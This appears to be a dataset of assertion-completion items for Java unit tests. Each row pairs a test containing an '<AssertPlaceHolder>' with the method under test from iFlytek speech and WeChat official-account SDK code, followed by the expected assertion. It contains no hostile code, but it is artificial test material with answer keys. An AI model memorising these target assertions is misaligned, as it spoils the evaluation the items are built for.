deleteTask(String token, String taskId) throws IOException { String param = ""{""task_id"":"""" + taskId +""""}""; hostUrl = ""https://callapi.xfyun.cn/v1/service/v1/aicall/outbound/v1/task/delete?token=""+token; String result = connector.postByJson(hostUrl, param); return StringUtils.gson.fromJson(result, new TypeToken<TelerobotResponse<Object>>() {}.getType()); }"	assertTrue(telerobotResponse.getCode() >= 0)
"Exception { config(); TaskQuery taskQuery = new TaskQuery(); taskQuery.setTask_id(""5853928459405440""); taskQuery.setTask_name(""abelTest""); TelerobotResponse<TelerobotTaskQuery> telerobotResponse = telerobotClient.queryTask(token, taskQuery); System.out.println(gson.toJson(telerobotResponse)); ""<AssertPlaceHolder>""; }
queryTask(String token, TaskQuery taskQuery) throws IOException { hostUrl = ""https://callapi.xfyun.cn/v1/service/v1/aicall/outbound/v1/task/query?token=""+token; String result = connector.postByJson(hostUrl, StringUtils.gson.toJson(taskQuery)); return StringUtils.gson.fromJson(result, new TypeToken<TelerobotResponse<TelerobotTaskQuery>>() {}.getType()); }"	assertEquals(0, telerobotResponse.getCode())
"Exception { LfasrExecutorService lfasrExecutorService = LfasrExecutorService.build(10, 30, 1000, 300, 22); Task task = PowerMockito.mock(Task.class); LfasrMessage message = new LfasrMessage(); message.setOk(1);  Future<LfasrMessage> future = PowerMockito.mock(Future.class); PowerMockito.when(future.get(10322, TimeUnit.MILLISECONDS)).thenReturn(message); lfasrExecutorService.exec(task); ""<AssertPlaceHolder>""; }
exec(Task task) { task.setConnector(this.connector); Future<LfasrMessage> future = this.executor.submit(task); return getFuture(future, task); }"	assertEquals(1, message.getOk())
"Exception { LfasrExecutorService lfasrExecutorService = LfasrExecutorService.build(10, 30, 1000, 300, 22); LfasrMessage message = new LfasrMessage(); message.setOk(1);  Future<LfasrMessage> future = PowerMockito.mock(Future.class); PowerMockito.when(future.get(10322, TimeUnit.MILLISECONDS)).thenReturn(message);  message = Whitebox.invokeMethod(lfasrExecutorService, ""getFuture"", future, Mockito.mock(Task.class)); ""<AssertPlaceHolder>""; }
build(int coreThreads, int maxThreads, int maxConnections, int connTimeout, int soTimeout) { LfasrExecutorService processor = ProcessorBuilder.PROCESSOR;  ThreadFactory namedThreadFactory = new ThreadFactoryBuilder().setNameFormat(""Lfasr-pool-%d"").build(); processor.executor = new ThreadPoolExecutor(coreThreads, maxThreads, 5L, TimeUnit.SECONDS, new LinkedBlockingDeque<>(1024), namedThreadFactory, new ThreadPoolExecutor.AbortPolicy());  processor.connector = HttpConnector.build(maxConnections, connTimeout, soTimeout, 3);  processor.thresholdTimeout = connTimeout + soTimeout + 10000; return processor; }"	assertEquals(1, message.getOk())
"Exception { LfasrExecutorService lfasrExecutorService = LfasrExecutorService.build(10, 30, 1000, 300, 22);  Future<LfasrMessage> future = PowerMockito.mock(Future.class); PowerMockito.when(future.get(10322, TimeUnit.MILLISECONDS)).thenThrow(ExecutionException.class);  LfasrMessage message = Whitebox.invokeMethod(lfasrExecutorService, ""getFuture"", future, Mockito.mock(Task.class)); ""<AssertPlaceHolder>""; }
build(int coreThreads, int maxThreads, int maxConnections, int connTimeout, int soTimeout) { LfasrExecutorService processor = ProcessorBuilder.PROCESSOR;  ThreadFactory namedThreadFactory = new ThreadFactoryBuilder().setNameFormat(""Lfasr-pool-%d"").build(); processor.executor = new ThreadPoolExecutor(coreThreads, maxThreads, 5L, TimeUnit.SECONDS, new LinkedBlockingDeque<>(1024), namedThreadFactory, new ThreadPoolExecutor.AbortPolicy());  processor.connector = HttpConnector.build(maxConnections, connTimeout, soTimeout, 3);  processor.thresholdTimeout = connTimeout + soTimeout + 10000; return processor; }"	"assertTrue(message.getFailed().contains(""服务调用异常""))"
"Exception { LfasrExecutorService lfasrExecutorService = LfasrExecutorService.build(10, 30, 1000, 300, 22);  Future<LfasrMessage> future = PowerMockito.mock(Future.class); PowerMockito.when(future.get(10322, TimeUnit.MILLISECONDS)).thenThrow(TimeoutException.class);  LfasrMessage message = Whitebox.invokeMethod(lfasrExecutorService, ""getFuture"", future, Mockito.mock(Task.class)); ""<AssertPlaceHolder>""; }
build(int coreThreads, int maxThreads, int maxConnections, int connTimeout, int soTimeout) { LfasrExecutorService processor = ProcessorBuilder.PROCESSOR;  ThreadFactory namedThreadFactory = new ThreadFactoryBuilder().setNameFormat(""Lfasr-pool-%d"").build(); processor.executor = new ThreadPoolExecutor(coreThreads, maxThreads, 5L, TimeUnit.SECONDS, new LinkedBlockingDeque<>(1024), namedThreadFactory, new ThreadPoolExecutor.AbortPolicy());  processor.connector = HttpConnector.build(maxConnections, connTimeout, soTimeout, 3);  processor.thresholdTimeout = connTimeout + soTimeout + 10000; return processor; }"	"assertTrue(message.getFailed().contains(""连接超时""))"
"Exception { LfasrExecutorService lfasrExecutorService = LfasrExecutorService.build(10, 30, 1000, 300, 22);  Future<LfasrMessage> future = PowerMockito.mock(Future.class); PowerMockito.when(future.get(10322, TimeUnit.MILLISECONDS)).thenThrow(InterruptedException.class);  LfasrMessage message = Whitebox.invokeMethod(lfasrExecutorService, ""getFuture"", future, Mockito.mock(Task.class)); ""<AssertPlaceHolder>""; }
build(int coreThreads, int maxThreads, int maxConnections, int connTimeout, int soTimeout) { LfasrExecutorService processor = ProcessorBuilder.PROCESSOR;  ThreadFactory namedThreadFactory = new ThreadFactoryBuilder().setNameFormat(""Lfasr-pool-%d"").build(); processor.executor = new ThreadPoolExecutor(coreThreads, maxThreads, 5L, TimeUnit.SECONDS, new LinkedBlockingDeque<>(1024), namedThreadFactory, new ThreadPoolExecutor.AbortPolicy());  processor.connector = HttpConnector.build(maxConnections, connTimeout, soTimeout, 3);  processor.thresholdTimeout = connTimeout + soTimeout + 10000; return processor; }"	"assertTrue(message.getFailed().contains(""服务调用异常""))"
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(1); Gson gson = new Gson(); PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/merge""), Mockito.anyMap())).thenReturn(gson.toJson(message));  String taskId = ""2452435""; MergeTask mergeTask = new MergeTask(signature, taskId); Whitebox.setInternalState(mergeTask, ""connector"", connector);  LfasrMessage returnMessage = mergeTask.call(); ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/merge"", this.param)); } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(1); Gson gson = new Gson(); //        PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/merge""), Mockito.anyMap())).thenThrow(HttpException.class); // //        String taskId = ""2452435""; //        MergeTask mergeTask = new MergeTask(signature, taskId); //        Whitebox.setInternalState(mergeTask, ""connector"", connector); // //        LfasrMessage returnMessage = mergeTask.call(); //        ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/merge"", this.param)); } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(1); Gson gson = new Gson(); PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/merge""), Mockito.anyMap())).thenThrow(IOException.class);  String taskId = ""2452435""; MergeTask mergeTask = new MergeTask(signature, taskId); Whitebox.setInternalState(mergeTask, ""connector"", connector);  LfasrMessage returnMessage = mergeTask.call(); ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/merge"", this.param)); } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(-1); Gson gson = new Gson(); PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/prepare""), Mockito.anyMap())).thenReturn(gson.toJson(message));  String taskId = ""2452435""; Map<String, String> param = new HashMap<>(); PrepareTask prepareTask = new PrepareTask(signature, param); Whitebox.setInternalState(prepareTask, ""connector"", connector);  LfasrMessage returnMessage = prepareTask.call(); ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/prepare"", this.param)); if (message.getOk() == LfasrTaskStatusEnum.STATUS_FAILED.getKey()) { message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(1); //        PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/prepare""), Mockito.anyMap())).thenThrow(HttpException.class);  //        String taskId = ""2452435""; //        Map<String, String> param = new HashMap<>(); //        PrepareTask prepareTask = new PrepareTask(signature, param); //        Whitebox.setInternalState(prepareTask, ""connector"", connector); // //        LfasrMessage returnMessage = prepareTask.call(); //        ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/prepare"", this.param)); if (message.getOk() == LfasrTaskStatusEnum.STATUS_FAILED.getKey()) { message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(1); PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/prepare""), Mockito.anyMap())).thenThrow(IOException.class);  String taskId = ""2452435""; Map<String, String> param = new HashMap<>(); PrepareTask prepareTask = new PrepareTask(signature, param); Whitebox.setInternalState(prepareTask, ""connector"", connector);  LfasrMessage returnMessage = prepareTask.call(); ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/prepare"", this.param)); if (message.getOk() == LfasrTaskStatusEnum.STATUS_FAILED.getKey()) { message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(-1); Gson gson = new Gson(); PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/getResult""), Mockito.anyMap())).thenReturn(gson.toJson(message));  String taskId = ""2452435""; PullResultTask pullResultTask = new PullResultTask(signature, taskId); Whitebox.setInternalState(pullResultTask, ""connector"", connector);  LfasrMessage returnMessage = pullResultTask.call(); ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/getResult"", this.param)); } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(-1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(1); //        PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/getResult""), Mockito.anyMap())).thenThrow(HttpException.class);  //        String taskId = ""2452435""; //        PullResultTask pullResultTask = new PullResultTask(signature, taskId); //        ; //        Whitebox.setInternalState(pullResultTask, ""connector"", connector); // //        LfasrMessage returnMessage = pullResultTask.call(); //        ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/getResult"", this.param)); } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(1); PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/getResult""), Mockito.anyMap())).thenThrow(IOException.class);  String taskId = ""2452435""; PullResultTask pullResultTask = new PullResultTask(signature, taskId); Whitebox.setInternalState(pullResultTask, ""connector"", connector);  LfasrMessage returnMessage = pullResultTask.call(); ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/getResult"", this.param)); } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(-1); Gson gson = new Gson(); PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/getProgress""), Mockito.anyMap())).thenReturn(gson.toJson(message));  String taskId = ""2452435""; QueryProgressTask queryProgressTask = new QueryProgressTask(signature, taskId); Whitebox.setInternalState(queryProgressTask, ""connector"", connector);  LfasrMessage returnMessage = queryProgressTask.call(); ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/getProgress"", this.param)); } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(-1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(1); //        PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/getProgress""), Mockito.anyMap())).thenThrow(HttpException.class);  //        String taskId = ""2452435""; //        QueryProgressTask queryProgressTask = new QueryProgressTask(signature, taskId); //        Whitebox.setInternalState(queryProgressTask, ""connector"", connector); // //        LfasrMessage returnMessage = queryProgressTask.call(); //        ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/getProgress"", this.param)); } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(1, returnMessage.getOk())
"HttpException { LfasrSignature signature = PowerMockito.mock(LfasrSignature.class); HttpConnector connector = PowerMockito.mock(HttpConnector.class);  LfasrMessage message = new LfasrMessage(); message.setOk(1); PowerMockito.when(connector.post(Mockito.eq(""https://raasr.xfyun.cn/api/getProgress""), Mockito.anyMap())).thenThrow(IOException.class);  String taskId = ""2452435""; QueryProgressTask queryProgressTask = new QueryProgressTask(signature, taskId); Whitebox.setInternalState(queryProgressTask, ""connector"", connector);  LfasrMessage returnMessage = queryProgressTask.call(); ""<AssertPlaceHolder>""; }
call() { LfasrMessage message = new LfasrMessage(); try { message = resolveMessage(this.connector.post(""https://raasr.xfyun.cn/api/getProgress"", this.param)); } catch (Exception e) { logger.warn(getIntro() + "" 处理失败"", e); message.setOk(LfasrTaskStatusEnum.STATUS_1.getKey()); } return message; }"	assertEquals(1, returnMessage.getOk())
"selectQuotaTest() { ApiResponse response = openApiManager.selectQuota(""/cgi-bin/message/custom/send""); Assert.""<AssertPlaceHolder>""; }
selectQuota(@NotBlank(message = ""cgiPath不能为空"") String cgiPath) throws WeChatException, ParamCheckException { String token = weChatTokenRepository.get();  JSONObject jsonObject = new JSONObject(); jsonObject.put(""cgi_path"", cgiPath);  String url = MessageFormat.format(UrlConstant.OPEN_API_SELECT_QUOTA, token); LoggerUtils.debug( ""查询每日调用接口次数url:{}"", url);  String json = jsonObject.toJSONString(); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); HttpEntity<String> request = new HttpEntity<>(json, headers); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); LoggerUtils.debug( ""查询每日调用接口次数返回结果:{}"", body); ApiResponse weChatResponse = JSONObject.parseObject(body, ApiResponse.class); if (!weChatResponse.isSuccessful()) { throw new WeChatException(weChatResponse); } return weChatResponse; }"	"assertNotNull(""查询结果不应该为空"",response)"
"getAuthorizeUrlTest() { try { String url = webPageAuthorizationManager.getAuthorizeUrl(""http://www.jlxxw.net"", AuthScope.BASE, null); Assert.""<AssertPlaceHolder>""; } catch (UnsupportedEncodingException e) { throw new RuntimeException(e); } }
getAuthorizeUrl(@NotBlank(message = ""重定向地址不能为空"") @Pattern(regexp = ""^([hH][tT]{2}"	assertNotNull(url)
"materialCountTest() { MaterialCountResponse materialCountResponse = materialManager.materialCount(); Assert.""<AssertPlaceHolder>""; }
materialCount() throws WeChatException{ String tokenFromLocal = weChatTokenRepository.get(); String url = MessageFormat.format(UrlConstant.MATERIAL_COUNT, tokenFromLocal);  ResponseEntity<String> response = restTemplate.getForEntity(url, String.class);  String json = response.getBody(); MaterialCountResponse body = JSON.toJavaObject(JSON.parseObject(json),MaterialCountResponse.class); if (!body.isSuccessful()){ throw new WeChatException(body); } return body; }"	"assertNotNull(""统计信息不应为空"",materialCountResponse)"
"downloadTest() { String mediaId = upload(); byte[] download = permanentMaterialManager.download(mediaId); Assert.""<AssertPlaceHolder>""; }
download(@NotBlank(message = ""下载素材id不能为空"") String mediaId) throws WeChatException, ParamCheckException{ String tokenFromLocal = weChatTokenRepository.get(); String url = MessageFormat.format(UrlConstant.DOWNLOAD_PERMANENT_MATERIAL, tokenFromLocal); LoggerUtils.debug( ""下载永久素材url:{}"", url); HttpHeaders headers = new HttpHeaders(); JSONObject media = new JSONObject(); media.put(""media_id"",mediaId); HttpEntity<Object> requestEntity = new HttpEntity<>(media.toJSONString(),headers); ResponseEntity<byte[]> entity = restTemplate.exchange(url, HttpMethod.POST,requestEntity, byte[].class); // 返回数据 byte[] body = entity.getBody(); HttpHeaders httpHeaders = entity.getHeaders(); MediaType contentType = httpHeaders.getContentType(); if (MediaType.APPLICATION_JSON.equalsTypeAndSubtype(contentType)){ // 是 json 类型 String json = new String(body, StandardCharsets.UTF_8); JSONObject jsonObject = JSONObject.parseObject(json);  WeChatResponse weChatResponse = JSON.toJavaObject(jsonObject,WeChatResponse.class); if (!weChatResponse.isSuccessful()){ throw new WeChatException(weChatResponse); } // 如果是视频，重新下载 String videoUrl = jsonObject.getString(""down_url""); ResponseEntity<byte[]> videoResponse = restTemplate.exchange(videoUrl, HttpMethod.GET,new HttpEntity<>(headers), byte[].class); return videoResponse.getBody(); } try{ JSONObject jsonObject = JSON.parseObject(new String(body, StandardCharsets.UTF_8)); WeChatResponse weChatResponse = jsonObject.toJavaObject(WeChatResponse.class); throw new WeChatException(weChatResponse); }catch (JSONException e){ // 忽略 } return body; }"	"assertNotNull(""下载数据不应为空"",download)"
"deleteTest() { String mediaId = upload(); WeChatResponse weChatResponse = permanentMaterialManager.deleteMaterial(mediaId); Assert.""<AssertPlaceHolder>""; }
deleteMaterial(@NotBlank(message = ""删除素材id不能为空"") String mediaId) throws WeChatException, ParamCheckException{ String tokenFromLocal = weChatTokenRepository.get(); String url = MessageFormat.format(UrlConstant.DELETE_PERMANENT_MATERIAL, tokenFromLocal); LoggerUtils.debug( ""删除永久素材url:{}"", url); HttpHeaders headers = new HttpHeaders(); JSONObject media = new JSONObject(); media.put(""media_id"",mediaId); HttpEntity<Object> requestEntity = new HttpEntity<>(media.toJSONString(),headers); ResponseEntity<String> entity = restTemplate.exchange(url, HttpMethod.POST,requestEntity, String.class); String body = entity.getBody(); LoggerUtils.debug( ""删除永久素材:{},返回值:"", mediaId,body); WeChatResponse weChatResponse = JSON.parseObject(body, WeChatResponse.class); if (!weChatResponse.isSuccessful()){ throw new WeChatException(weChatResponse); } return weChatResponse; }"	"assertTrue(""删除应该成功"",weChatResponse.isSuccessful())"
"uploadFileTest() { ClassPathResource classPathResource = new ClassPathResource(""./mock/data/png/img.png""); TempMaterialResponse upload = null; String currentDir = System.getProperty(""user.dir""); String filePath = currentDir + ""/temp/image.png""; File file = new File(filePath); try (InputStream inputStream = classPathResource.getInputStream() ) { FileUtils.copyToFile(inputStream, file); TempMaterialResponse response = tempMaterialManager.upload(MaterialEnum.IMAGE, file); Assert.""<AssertPlaceHolder>""; } catch (IOException e) { throw new RuntimeException(e); }finally { file.delete(); } }
upload( @NotNull(message = ""文件类型不能为空"") MaterialEnum materialEnum, @NotNull(message = ""文件不能为空"") File file) throws WeChatException{ FileSystemResource resource = new FileSystemResource(file); MultiValueMap<String, Object> param = new LinkedMultiValueMap<>(); //参数 param.add(""media"", resource); param.add(""type"", materialEnum.name().toLowerCase()); String tokenFromLocal = weChatTokenRepository.get(); String url = MessageFormat.format(UrlConstant.UPLOAD_TEMP_MATERIAL, tokenFromLocal, materialEnum.name().toLowerCase()); LoggerUtils.debug( ""新增临时素材url:{}"", url);  HttpEntity<MultiValueMap<String, Object>> httpEntity = new HttpEntity<MultiValueMap<String, Object>>(param); ResponseEntity<String> responseEntity = restTemplate.exchange(url, HttpMethod.POST, httpEntity, String.class);  String result = responseEntity.getBody(); LoggerUtils.debug( ""新增临时素材微信返回结果:{}"", result);  TempMaterialResponse response = JSON.parseObject(result,TempMaterialResponse.class); if (!response.isSuccessful()){ throw new WeChatException(result); } return response; }"	"assertTrue(""文件id不应该为空"", Objects.nonNull(response) && StringUtils.isNotBlank(response.getMediaId()))"
"downloadTest() { String mediaId = upload(); byte[] bytes = tempMaterialManager.downloadMaterial(mediaId); Assert.""<AssertPlaceHolder>""; }
downloadMaterial(@NotBlank(message = ""素材id不能为空"") String mediaId) throws WeChatException{ String tokenFromLocal = weChatTokenRepository.get(); String url = MessageFormat.format(UrlConstant.DOWN_TEMP_MATERIAL, tokenFromLocal, mediaId); LoggerUtils.debug( ""下载临时素材url:{}"", url); HttpHeaders headers = new HttpHeaders(); ResponseEntity<byte[]> entity = restTemplate.exchange(url, HttpMethod.GET,new HttpEntity<>(headers), byte[].class); // 返回数据 byte[] body = entity.getBody(); HttpHeaders httpHeaders = entity.getHeaders(); MediaType contentType = httpHeaders.getContentType(); if (MediaType.APPLICATION_JSON.equalsTypeAndSubtype(contentType)){ // 是 json 类型 String json = new String(body, StandardCharsets.UTF_8); JSONObject jsonObject = JSONObject.parseObject(json);  WeChatResponse weChatResponse = JSON.toJavaObject(jsonObject,WeChatResponse.class); if (!weChatResponse.isSuccessful()){ throw new WeChatException(weChatResponse); } // 如果是视频，重新下载 String videoUrl = jsonObject.getString(""video_url""); ResponseEntity<byte[]> videoResponse = restTemplate.exchange(videoUrl, HttpMethod.GET,new HttpEntity<>(headers), byte[].class); return videoResponse.getBody(); } try{ JSONObject jsonObject = JSON.parseObject(new String(body, StandardCharsets.UTF_8)); WeChatResponse weChatResponse = jsonObject.toJavaObject(WeChatResponse.class); throw new WeChatException(weChatResponse); }catch (JSONException e){ // 忽略 } return body; }"	"assertTrue(""文件不应该为空"", Objects.nonNull(bytes))"
"getMenuTest() { MenuResponse menu = menuManager.getMenu(); System.out.println(JSON.toJSONString(menu)); Assert.""<AssertPlaceHolder>""; }
getMenu() throws WeChatException { String url = MessageFormat.format(UrlConstant.GET_MENU_URL, weChatTokenRepository.get()); ResponseEntity<String> entity = restTemplate.getForEntity(url, String.class); String body = entity.getBody(); LoggerUtils.debug( ""获取公众号菜单，应答结果:{}"", body); MenuResponse response = JSONObject.parseObject(body, MenuResponse.class); if (StringUtils.isNotBlank(body) && !response.isSuccessful()) { throw new WeChatException(response); } return response; }"	"assertNotNull(""返回值不应为null"",menu)"
"pushCustomerTest() { ArticlesDTO articlesDTO = new ArticlesDTO(); articlesDTO.setPicUrl(""测试图片url""); articlesDTO.setTitle(""这里一个测试的标题""); articlesDTO.setUrl(""测试跳转链接""); articlesDTO.setDescription(""测试描述信息""); CustomerMessageDTO dto = CustomerMessageDTO.buildNews(openId, articlesDTO); WeChatResponse weChatResponse = syncPushCustomer.pushCustomer(dto); Assert.""<AssertPlaceHolder>"";  }
pushCustomer(@NotNull(message = ""待处理的信息不能为空"") CustomerMessageDTO messageDTO) throws WeChatException,ParamCheckException{ HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); String json = JSON.toJSONString(messageDTO); HttpEntity<String> request = new HttpEntity<>(json, headers); String url = MessageFormat.format(UrlConstant.PUSH_CUSTOMER_PREFIX, weChatTokenRepository.get()); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); WeChatResponse weChatResponse = JSON.parseObject(body, WeChatResponse.class); if (!weChatResponse.isSuccessful()){ throw new WeChatException(weChatResponse); } return weChatResponse; }"	"assertTrue(""微信返回结果应该为成功"",weChatResponse.isSuccessful())"
"pushCustomerTextTest() { String text = ""这是一条测试用的信息\n"" + ""<a href='https://www.jlxxw.net'>点我查看主页</a>""; CustomerMessageDTO dto = CustomerMessageDTO.buildText(openId, text); WeChatResponse weChatResponse = syncPushCustomer.pushCustomer(dto); Assert.""<AssertPlaceHolder>"";  }
pushCustomer(@NotNull(message = ""待处理的信息不能为空"") CustomerMessageDTO messageDTO) throws WeChatException,ParamCheckException{ HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); String json = JSON.toJSONString(messageDTO); HttpEntity<String> request = new HttpEntity<>(json, headers); String url = MessageFormat.format(UrlConstant.PUSH_CUSTOMER_PREFIX, weChatTokenRepository.get()); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); WeChatResponse weChatResponse = JSON.parseObject(body, WeChatResponse.class); if (!weChatResponse.isSuccessful()){ throw new WeChatException(weChatResponse); } return weChatResponse; }"	"assertTrue(""微信返回结果应该为成功"",weChatResponse.isSuccessful())"
"pushTemplateTest() { String url = ""xxxxxx"";  WeChatTemplateDTO weChatTemplateDTO = new WeChatTemplateDTO(); weChatTemplateDTO .buildToUser(openId) .buildUrl(url) .buildTemplateCode(templateId) .buildFirstData(""first DATA的具体值"", ColorEnums.BLUE) .buildKeyWord1Data(""keyword1 DATA的具体值"", null) .buildOtherData(""abc"", ""abc DATA的具体值"", ColorEnums.ORANGE); WeChatResponse weChatResponse = syncPushTemplate.pushTemplate(weChatTemplateDTO);  Assert.""<AssertPlaceHolder>""; }
pushTemplate(@Validated(Insert.class) WeChatTemplateDTO template) throws ParamCheckException,WeChatException { HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); String json = JSON.toJSONString(template); HttpEntity<String> request = new HttpEntity<>(json, headers); String url = MessageFormat.format(UrlConstant.PUSH_TEMPLATE_PREFIX, weChatTokenRepository.get()); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); WeChatResponse weChatResponse = JSON.parseObject(body, WeChatResponse.class); if (!weChatResponse.isSuccessful()){ throw new WeChatException(weChatResponse); } return weChatResponse; }"	"assertEquals(""微信返回状态错误，当前为："" + JSON.toJSONString(weChatResponse), 0L, (int) weChatResponse.getErrcode())"
"createTempStringQrcodeTest() { String uuid = UUID.randomUUID().toString(); TempQrCodeResponse qrcode = qrcodeManager.createTempStringQrcode(uuid, 200L); Assert.""<AssertPlaceHolder>""; }
createTempStringQrcode( @NotBlank(message = ""自定义的eventKey不能为空"") String eventKey, @NotNull(message = ""自定义的过期时间不能为空"") @Max(value = 2592000,message = ""最大有效值不能超过2592000秒(30天)，超过会自动转换为2592000"") @Min(value = 60,message = ""最小有效值为60，小于60会自动转换为60"") Long expireSecond) throws WeChatException,ParamCheckException{ String token = weChatTokenRepository.get(); String url = MessageFormat.format(UrlConstant.CREATE_QRCODE_URL, token); JSONObject object = new JSONObject(); object.put(""action_name"", ""QR_STR_SCENE""); object.put(""expire_seconds"", expireSecond);  JSONObject scene = new JSONObject(); scene.put(""scene_str"", eventKey); JSONObject actionInfo = new JSONObject(); actionInfo.put(""scene"", scene); object.put(""action_info"", actionInfo);  String json = object.toJSONString(); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); HttpEntity<String> request = new HttpEntity<>(json, headers); ResponseEntity<String> responseEntity = 